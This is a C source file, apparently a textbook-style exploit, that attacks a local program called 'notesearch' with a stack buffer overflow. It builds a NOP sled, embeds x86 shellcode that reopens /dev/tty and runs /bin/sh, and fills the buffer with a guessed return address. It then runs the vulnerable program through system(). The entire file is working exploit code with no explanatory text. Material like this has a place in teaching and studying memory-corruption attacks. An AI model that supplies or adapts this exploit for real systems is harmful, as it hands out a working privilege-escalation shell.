#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68"
"/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12"
"\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh"
"\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0"
"\x0b\xcd\x80";

int main(int argc, char *argv[]) {
    unsigned int i, *ptr, ret, offset=270;
    char *command, *buffer;
    
    command = (char *) malloc(200);
    bzero(command, 200); // Zero out the new memory.
    
    strcpy(command, "./notesearch \'"); // Start command buffer.
    buffer = command + strlen(command); // Set buffer at the end.
    
    if(argc > 1) // Set offset.
        offset = atoi(argv[1]);
    
    ret = (unsigned int) &i - offset; // Set return address.
    
    for(i=0; i < 160; i+=4) // Fill buffer with return address.
        *((unsigned int *)(buffer+i)) = ret;
    memset(buffer, 0x90, 60); // Build NOP sled.
    memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
    
    strcat(command, "\'");
    
    system(command); // Run exploit.
    free(command);
}